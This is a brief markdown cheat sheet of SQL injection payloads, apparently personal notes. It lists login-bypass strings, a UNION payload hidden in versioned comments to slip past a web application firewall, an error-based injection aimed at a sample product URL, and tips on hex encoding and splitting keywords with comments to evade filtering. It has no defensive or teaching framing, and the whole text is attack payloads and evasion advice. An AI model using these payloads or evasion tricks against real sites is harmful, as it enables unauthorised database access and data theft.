# check 

- > if ``OR '1'='1'--`` not work try : 
  > 
  > ```
  > ' OR '1'='1' /*
  > ```
  >
  > if A WAF blocks typical SQL keywords ``(SELECT, UNION, OR)``.
  >
  > ```
  > 1' /*!UNION*/ SELECT 1,2--
  > ```
  >
  > most effective for error-based SQLi here ``https://example.com/product.php?id=5``
  >
  > ```
  > 5' AND (SELECT 1/0)--
  > ```
  >
  > Best advanced technique to bypass heavy WAF filtering:
  > > Use hex-encoded values and mid-query obfuscation like UN//ION**
  > > ```
  > > Obfuscation (e.g., UN/**/ION, 0x73656c656374 for 'select')
  > > ```
  >
  > 
